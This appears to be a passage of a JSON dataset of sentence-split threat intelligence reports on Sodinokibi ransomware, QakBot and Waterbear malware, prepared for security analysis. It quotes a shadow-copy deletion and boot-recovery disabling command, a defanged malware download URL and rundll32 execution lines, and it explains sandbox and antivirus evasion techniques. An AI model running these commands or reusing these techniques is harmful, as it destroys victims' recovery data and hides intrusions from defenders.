        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S34",
        "text": "For example, if the extension is \".1cd8t9ahd5\", the ransom message filename will be called \"1cd8t9ahd5-HOW-TO-DECRYPT.txt\".\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S35",
        "text": "The ransom note recommends accessing the attacker\u2019s website over the TOR browser: hxxp://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/C2D97495C4BA3647",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S36",
        "text": "When we accessed the website, we saw the following page that wants 0,6346 Bitcoin worth $5,000.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S37",
        "text": "If you pay the ransom in two days, the cost is halving.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S38",
        "text": "In the \u201cABOUT US\u201d section on their website, they claim that they developed the best data encryption and decryption system available today.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S39",
        "text": "I am sure they did not develop the best encryption method, but they use multiple encryption by encrypting files and also the private keys.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S40",
        "text": "To put it another way, it requires two keys for decryption.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S41",
        "text": "Sodinokibi uses AES encryption to encrypt the private keys, and Salsa20 for encrypting files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md:::S42",
        "text": "As far as I know, unfortunately there are no decryption tools to restore data encrypted by Sodinokibi ransomware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S0",
        "text": "Qakbot, also known as QBot or Pinkslipbot, is a modular information stealer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S1",
        "text": "It has been active since 2007 and primarily used by financially motivated actors.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S2",
        "text": "It was initially known as a banking Trojan and a loader using C2 servers for payload delivery; however, its use expanded beyond strictly being a banking trojan.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S3",
        "text": "The hallmarks of a QakBot infection chain consist of a phishing lure (T1566) delivered via email chain hijacking or spoofed emails that contain context-aware information such as shipping, work orders, urgent requests, invoices, claims, etc.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S4",
        "text": "The phishing emails alternate between file attachments (T1566.001) and links (T1566.002).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S5",
        "text": "QakBot is often used as a gateway entry, similar to TrickBot or Emotet, that leads to post exploitation operations leveraging frameworks such as Cobalt Strike as well as delivering Ransomware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S6",
        "text": "QakBot email lures are not the most sophisticated; however, by using contextually aware themes that originate from hijacked email chains or potentially compromised accounts within a user\u2019s social circle, they are effective.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S7",
        "text": "Figure 1 below illustrates an example of a recent QakBot lure with the subject \u201cRe: SIGNED QUOTE\u201d and a ZIP file attachment labeled \u201cCancellation_Letter_272020508-02242021.zip\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S8",
        "text": "The actors further establish the trust and confidence of the targeted user by presenting a semi-official looking DocuSign graphic that guides the user through the process of enabling the Excel 4 Macros.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S9",
        "text": "A representative sample, 78ea3550e2697cd06b07df568242f7fc9f57e4d2b297b74f6ce26e97613de53a, seen in a recent QakBot campaign is shown in Figure 2 below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S10",
        "text": "QakBot Excel spreadsheets often contain hidden spreadsheets, Excel 4.0 macros, spreadsheet formulas, and BIFF records all designed to pass a visual inspection from the user with the added benefit of bypassing detection mechanisms that attempt to parse multiple legacy formats inside the spreadsheet.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S11",
        "text": "Figure 3 below shows a screenshot of output from the open-source XLMMacroDeobfuscator tool, which decodes obfuscated Excel 4.0 macros.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S12",
        "text": "Once the Excel 4.0 macro is decoded it is possible to see the CALL to URLDownloadToFileA, which downloads the QakBot DLL in this campaign from http[:]//rlyrt26rnxw02vqijgs[.]com/fera/frid[.]gif.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S13",
        "text": "Next, the EXEC function is evaluated which executes \u201crundll32.exe nxckew.wle, DllRegisterServer\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S14",
        "text": "It is also a common tactic for QakBot to execute \u201cregsvr32.exe -s nxckew.wle,DllRegisterServer\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S15",
        "text": "Both instances are designed to evade sandbox environments that do not supply the expected command line arguments.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S16",
        "text": "A representative QakBot DLL analyzed by Alien Labs, 9a353d4b85b3097762282703f1807c2b459698966b967280c8e4e13cc56d2e28, has two exports: the entry point (0x10005a5d) and DllRegisterServer (0x10029c88)and if DllRegisterServer is not called via regsvr32.exe or rundll32.exe with command line options, then only the entry point is called and the malicious code in DllRegisterServer is not called.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S17",
        "text": "Figure 3 below shows improved readability and de-obfuscation of the macro by manually replacing and substituting the cell values and formulas.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S18",
        "text": "The results of our additional de-obfuscation efforts are confirmed when the QakBot Excel spreadsheet is run inside a sandbox in Figure 4 below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S19",
        "text": "xckew.wle, DllRegisterServer'' execution",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S20",
        "text": "Before executing the main payload, the QakBot loader will first test the infected system to see if it is a good candidate for infection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S21",
        "text": "The QakBot loader is responsible for checking its environment to include whether it is running on a Virtual Machine, identifying any installed and running security and monitoring tools such as AntiVirus products or common security researcher tools.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S22",
        "text": "Figure 5 below shows a high-level execution flow of the QakBot loader.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S23",
        "text": "To make detection and analysis harder, QakBot encrypts its strings and decrypts them at runtime before use.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S24",
        "text": "Once the QakBot execution logic is finished using a string, it will immediately delete the string from memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S25",
        "text": "An example of this can be seen in Figure 6 below, which shows QakBot decrypting a string containing the value for lpProcName passed as a parameter to the GetProcAddress API call.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S26",
        "text": "The selected function, which has been labeled in IDA Pro as, \u201coc_clear_mem\u201d deletes the string memory right after it retrieves the process address.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S27",
        "text": "When executed, QakBot will check whether it has previously been executed on the machine by checking for the specified malware folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S28",
        "text": "If QakBot discovers it is a first time run, it will relaunch itself from cmd.exe with the /C parameter that will inform the loader to proceed and run its Anti-VM checks on the machine and return the results to the parent process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S29",
        "text": "If QakBot detects it is running in a VM environment, then the final payload will not be decrypted since QakBot uses the return value from these checks in its final decryption routine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S30",
        "text": "Figure 7 below shows the QakBot environment check logic.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S31",
        "text": "Specifically, QakBot checks the system for the names of running processes that match the strings listed in Table 1 below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S32",
        "text": "PROCESS NAMES Autoruns.exe bds-vision-agent-app.exe bds-vision-agent-nai.exe bds-vision-apis.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S33",
        "text": "CFF Explorer.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S34",
        "text": "dsniff.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S35",
        "text": "dumpcap.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S36",
        "text": "Fiddler.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S37",
        "text": "HashMyFiles.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S38",
        "text": "idaq.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S39",
        "text": "idaq64.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S40",
        "text": "lordpe.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S41",
        "text": "MultiAnalysis_v1.0.294.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S42",
        "text": "netmon.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S43",
        "text": "OLLYDBG.EXE pr0c3xp.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S44",
        "text": "ProcessHacker.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S45",
        "text": "Procmon.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S46",
        "text": "Procmon64.exe regshot.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S47",
        "text": "ResourceHacker.exe runsample.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S48",
        "text": "samp1e.exe sample.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S49",
        "text": "Tcpview.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S50",
        "text": "TPAutoConnect.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S51",
        "text": "VBoxService.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S52",
        "text": "VBoxTray.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S53",
        "text": "VGAuthService.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S54",
        "text": "vm3dservice.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S55",
        "text": "vmacthlp.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S56",
        "text": "vmtoolsd.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S57",
        "text": "windbg.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S58",
        "text": "Wireshark.exe x32dbg.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S59",
        "text": "x64dbg.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S60",
        "text": "QakBot will also add its folder to the Windows Defender exclusions setting located in the Registry (T1112), which prevents Defender from scanning QakBot artifacts.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S61",
        "text": "The Registry location can be seen in Figure 9 below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S62",
        "text": "In addition to the previously mentioned environment check, QakBot collects system information (T1082) such as computer name, system directories, user profiles, and more, which is shown in Figure 10 below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S63",
        "text": "QakBot will use process hollowing (T1055.012) in order to inject itself into explorer.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S64",
        "text": "If it is unsuccessful then QakBot will attempt to inject itself into mobsync.exe or iexplore.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S65",
        "text": "The screen shot in Figure 11 illustrates the QakBot process name decryption routine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S66",
        "text": "Additionally, QakBot abuses the Service Control Manager (SCM) to create a child process, which is then detached from the parent when the SCM terminates the parent process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S67",
        "text": "QakBot C2 communications begin in this stage to make it more difficult to monitor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S68",
        "text": "Figure 13 below shows the SCM spawned process abuse technique.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S69",
        "text": "Finally, if the QakBot loader has verified its execution environment has passed its tests, then QakBot will proceed to decrypt and execute the main QakBot payload, which is hidden as resource \u201c307\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S70",
        "text": "The decryption and import table resolution of its main payload is shown in Figure 15 below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S71",
        "text": "The combined anti-analysis and evasion techniques across the infection chain significantly impair antivirus, EDR, and other security defenses from detecting and preventing the initial infection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S72",
        "text": "Despite the limitations and challenges presented by QakBot DLLs there is ample opportunity to detect QakBot loaders signed by revoked and blacklisted malicious certificates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S73",
        "text": "Alien Labs has identified 42 unique signers and signature serial numbers, which are included in Detection Methods section to aid in detection and hunting with YARA and Osquery.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md:::S74",
        "text": "Additionally, there are a number of behavioral patterns, Indicators of Behavior (IOB), which provide opportunities for detection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S0",
        "text": "Upon execution, Sodinokibi will create a mutex with a hardcoded name Global\\206D87E0-0E60-DF25-DD8F-8E4E7D1E3BF0 and decrypt an embedded configuration.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S1",
        "text": "If the exp parameter in the configuration is set, the malware will attempt to exploit CVE-2018-8453 in order to gain SYSTEM privileges (see the \u201cPrivilege escalation\u201d section for more details).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S2",
        "text": "If not configured to execute the exploit, or if the attempt is unsuccessful, it will instead try to re-run itself as an administrator.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S3",
        "text": "Sodinokibi gathers some basic system information and saves it to the registry together with the generated encryption parameters.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S4",
        "text": "If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S5",
        "text": "Code Language 0x818",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S6",
        "text": "Romanian 0x419 Russian 0x819 Russian (Moldova) 0x422",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S7",
        "text": "Ukrainian 0x423 Belarusian 0x425 Estonian* 0x426 Latvian* 0x427 Lithuanian* 0x428 Tajik 0x429 Persian* 0x42B Armenian 0x42C Azeri 0x437",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S8",
        "text": "Georgian 0x43F Kazakh 0x440 Kygyz 0x442",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S9",
        "text": "Turkmen 0x443 Uzbek 0x444 Tatar 0x45A",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S10",
        "text": "Syrian 0x2801",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S11",
        "text": "Arabic (Syria)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S12",
        "text": "The malware will exit only if the keyboard layout value belongs to these countries, but the OS language value is equal to one of the remaining languages.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S13",
        "text": "If the system language is not one of the excluded languages, Sodinokibi will terminate all processes specified by the prc value in the config and delete volume shadow copies before starting the file encryption routine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S14",
        "text": "cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S15",
        "text": "The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config\u2019s exception list.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S16",
        "text": "Unless the executable was run with -nolan command line parameter, the malware will also attempt to encrypt files on network shares.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S17",
        "text": "The file encryption routine is discussed in detail in the \u201cFile encryption\u201d section.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S18",
        "text": "Each encrypted file will be renamed by adding a previously generated pseudo-random extension, which is stored in the rnd_ext value in the registry.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S19",
        "text": "A README file will be dropped in each directory and the background wallpaper will be set with a ransom message:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S20",
        "text": "The contents of the README file, as well as the ransom message, are again specified in the config.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S21",
        "text": "The key requested by the attackers is a combination of the victim\u2019s system information and generated encryption metadata (needed to derive the decryption keys for the files), AES encrypted and base64 encoded (see \u201cFile encryption\u201d section for more details).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md:::S22",
        "text": "Other parameters from the configuration that affect the malware\u2019s behavior are wipe (if set, all the files in folders listed under wfld will be zeroed out and deleted) and net (if set, the ransomware will broadcast the victim's system information to a range of domains listed in the dmn value in the config).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S0",
        "text": "We saw a Waterbear loader named \"ociw32.dll\" inside one of the folders in the %PATH% environmental variable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S1",
        "text": "This DLL name is hardcoded inside \"mtxoci.dll\" which is loaded by the MSDTC service during boot-up.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S2",
        "text": "\u201cmtxoci.dll\u201d first tries to query the registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\" to see if the value \"OracleOciLib\" exists.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S3",
        "text": "If so, it retrieves the data inside it and loads the corresponding library.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S4",
        "text": "If the value doesn't exist, \u201cmtxoci.dll\u201d tries to load \"ociw32.dll\" instead.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S5",
        "text": "During our investigation, we noticed that the value \"OracleOciLib\" was deleted from the victim's machine, as shown in Figure 2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S6",
        "text": "Hence, the malicious loader \"ociw32.dll\" was loaded and successfully executed on the host.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S7",
        "text": "Note: The image on the left shows how the DLL on a normal machine normally looks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S8",
        "text": "The image on the right showcases how the DLL on a victim's machine appears.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S9",
        "text": "Because there is no \"OracleOciLib\" value, it loads the hardcoded DLL \"ociw32.dll\" instead, which triggers the malicious Waterbear DLL loader.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S10",
        "text": "After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S11",
        "text": "The decryption algorithm is RC4, which takes the hardcoded path to form the decryption key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S12",
        "text": "If the decrypted payload is valid, it picks a specific existing Windows Service \u2014 LanmanServer, which is run by svchost.exe \u2014 and injects the decrypted shellcode into the legitimate service.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S13",
        "text": "In most cases, the payload is a first-stage backdoor, and its main purpose is to retrieve second-stage payloads \u2014 either by connecting to a C&C server or opening a port to wait for external connections and load incoming executables.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S14",
        "text": "In order to avoid in-memory scanning during runtime, the payload encrypts all of the function blocks before executing the actual malicious routine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S15",
        "text": "Afterwards, whenever it needs to use a function, it will decrypt the function, execute it, and encrypt the function back again, as can be seen in Figure 4.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S16",
        "text": "If a function will not be used on the rest of the execution, it will be scrambled by another mess-up function, as illustrated in Figure 6.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S17",
        "text": "The mess-up function muddles up the bytes with random values and makes the input blocks unrecoverable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S18",
        "text": "The purpose of this is to further avoid being detected by a certain cybersecurity solution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S19",
        "text": "During our investigation, we found a peculiar incident that stands out from most of the Waterbear infections we\u2019ve previously seen.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S20",
        "text": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S21",
        "text": "Meanwhile, the second payload is a typical Waterbear first-stage backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S22",
        "text": "Both payloads were encrypted and stored on the victim\u2019s disk and were injected into the same service, which was, in this case, LanmanServer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S23",
        "text": "We have observed that the loader tried to read the payloads from the files, decrypted them, and performed thread injections with the following conditions:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S24",
        "text": "If the first payload could not be found on the disk, the loader would be terminated without loading the second one.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S25",
        "text": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S26",
        "text": "In the first injected thread, if the necessary executable from the security product was not found, the thread would be terminated without performing other malicious routines.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S27",
        "text": "Note that only the thread would be terminated, but the service would still be running.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S28",
        "text": "Regardless if the API hooking was performed or otherwise, the second backdoor would still be executed after having been successfully loaded.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S29",
        "text": "In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S30",
        "text": "It hooks two different APIs, namely \"ZwOpenProcess\" and \"GetExtendedTcpTable\", to hide its specific processes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S31",
        "text": "The payload only modifies the functions in the memory of the security product process, hence the original system DLL files remain unchanged.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S32",
        "text": "The payload is composed of a two-stage shellcode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S33",
        "text": "The first-stage shellcode finds a specific security product's process with a hardcoded name and injects the second-stage shellcode into that process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S34",
        "text": "The second-stage shellcode then performs API hooking inside the targeted process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S35",
        "text": "The process identifiers or PIDs to be hidden are stored in the shared memory \"Global\\<computer_name>.\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S36",
        "text": "If the shared memory doesn't exist, it takes the PID embedded by the first-stage shellcode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S37",
        "text": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S38",
        "text": "Therefore, the first-stage shellcode takes the PID of the Windows Service \u2014 which the first-stage shellcode and the succeeding backdoor both inject into \u2014 hides the target process, and embeds that PID into the second-stage shellcode.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S39",
        "text": "The purpose of hooking \u201cZwOpenProcess\u201d is to protect the specific process from being accessed by the security product.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S40",
        "text": "Whenever \u201cZwOpenProcess\u201d is called, the injected code will first check if the opened process hits any PIDs in the protected process ID list.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S41",
        "text": "If yes, it modifies the process ID, which should open on another Windows Service PID.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S42",
        "text": "First, it builds the hooked function and writes the function at the end of \u201cntdll.dll\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S43",
        "text": "This function includes two parts, as shown in Figure 9:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S44",
        "text": "The PID checking procedure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S45",
        "text": "It recursively checks if the PID to be opened by \u201cZwOpenProcess\u201d is in the list of the protected process IDs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S46",
        "text": "If yes, it replaces the PID to be opened with another Windows Service PID that has been written by the Waterbear loader in the beginning.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S47",
        "text": "After the PID checking procedure, it executes the original \u201cZwOpenProcess\u201d and returns the result.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S48",
        "text": "Secondly, it writes \"push <ADDRESS> ret\" at the beginning of the original \u201cZwOpenProcess\u201d address.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S49",
        "text": "Hence, when \u201cZwOpenProcess\u201d is called, the modified version of \u201cZwOpenProcess\u201d will be executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S50",
        "text": "The API hooking on \u201cZwOpenProcess\u201d will only be triggered if \"%temp%\\KERNELBASE.dll\" exists on the host.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S51",
        "text": "It is possible that this check is designed according to the nature of the security product it targets.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S52",
        "text": "The second part of API hooking hooks on \u201cGetExtendedTcpTable.\u201d",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S53",
        "text": "\u201cGetExtendedTcpTable\u201d is used for retrieving a table that contains a list of TCP endpoints available to the application, and it is frequently used in some network-related commands, such as netstat.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S54",
        "text": "The purpose of the hook is to remove TCP endpoint records of certain PIDs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S55",
        "text": "In order to achieve that, it modifies two functions: \u201cGetExtendedTcpTable\u201d and \u201cGetRTTAndHopCount.\u201d",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S56",
        "text": "The second function, \u201cGetRTTAndHopCount,\u201d acts as the place to put the injected hooking code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S57",
        "text": "\u201cGetExtendedTcpTable\u201d only writes a jump to \u201cGetRTTAndHopCount\u201d in the beginning of the function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S58",
        "text": "Only the first 5 bytes of the code of the API \"GetExtendedTcpTable\" are changed, as shown in Figure 11.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S59",
        "text": "The rest of the routine is all placed in \u201cGetRTTAndHopCount.\u201d",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S60",
        "text": "In the first part of the code, it pushes [\u201cGetRTTAndHopCount\u201d+0x3E] as the return address and then executes the first four instructions of the original \u201cGetExtendedTcpTable\u201d function (which has already been replaced by the jump instruction in Figure 11).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S61",
        "text": "After that, it jumps to \u201cGetExtendedTcpTable\u201d to execute the function normally and to catch its return values.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S62",
        "text": "The code is shown in Figure 12.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S63",
        "text": "After \u201cGetExtendedTcpTable\u201d is executed and the process returns back to the second part of the code",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S64",
        "text": ", it iteratively checks every record in the returned Tcp table.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S65",
        "text": "If any record contains the PID Waterbear wants to hide, it will remove the corresponding record, modify the record number inside the table, and continue to check the succeeding records.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S66",
